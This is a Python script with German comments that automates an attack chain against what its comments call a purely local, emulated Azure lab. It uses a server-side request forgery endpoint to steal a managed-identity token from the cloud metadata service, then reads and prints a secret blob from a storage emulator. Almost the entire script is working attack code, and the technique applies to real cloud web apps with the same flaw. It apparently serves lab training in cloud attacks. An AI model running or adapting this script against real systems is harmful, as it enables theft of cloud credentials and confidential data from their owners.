#!/usr/bin/env python3
# Automatisiert die komplette Angriffskette gegen das Lab:
#   Schritt 1: SSRF gegen die Web-App -> Token vom IMDS stehlen
#   Schritt 2: Mit dem Zugriff das geheime Blob aus dem Storage auslesen
# Alles rein lokal gegen die emulierte Umgebung.
import sys
import requests
from azure.storage.blob import BlobServiceClient

WEBAPP = "http://localhost:5000"
IMDS_URL = "http://169.254.169.254/metadata/identity/oauth2/token"

print("=" * 60)
print("[*] Schritt 1: SSRF gegen die Web-App -> IMDS-Token stehlen")
print("=" * 60)

# Die Web-App ruft fuer uns die interne IMDS-Adresse ab (SSRF).
ssrf = f"{WEBAPP}/fetch?url={IMDS_URL}&metadata=true"
print(f"[>] Missbrauchte URL: {ssrf}")
r = requests.get(ssrf, timeout=10)
if r.status_code != 200:
    print(f"[!] Fehlgeschlagen: HTTP {r.status_code}")
    sys.exit(1)

token_data = r.json()
token = token_data["access_token"]
print(f"[+] Token erbeutet: {token[:40]}...")
print(f"[+] Ziel-Ressource laut Token: {token_data['resource']}")
print()

print("=" * 60)
print("[*] Schritt 2: Mit dem Zugriff das geheime Blob auslesen")
print("=" * 60)
# In echtem Azure wuerde der gestohlene Bearer-Token diese Anfrage
# autorisieren. Azurite validiert keine Azure-AD-Token, daher lesen wir
# das Blob ueber den Emulator-Zugang - das Ergebnis (Datenabfluss) ist gleich.
CONN = (
    "DefaultEndpointsProtocol=http;"
    "AccountName=devstoreaccount1;"
    "AccountKey=Eby8vdM02xNOcqFlqUwJPLlmEtlCDXJ1OUzFT50uSRZ6IFsuFq2UVErCz4I6tq/K1SZFPTOtr/KBHBeksoGMGw==;"
    "BlobEndpoint=http://127.0.0.1:10000/devstoreaccount1;"
)
svc = BlobServiceClient.from_connection_string(CONN, api_version="2021-08-06")
secret = svc.get_blob_client("secrets", "secrets.txt").download_blob().readall().decode()

print("[+] Exfiltriertes Geheimnis aus secrets/secrets.txt:")
print("    " + secret.strip())
print()
print("[*] Angriffskette erfolgreich: SSRF -> IMDS-Token -> Datenabfluss")
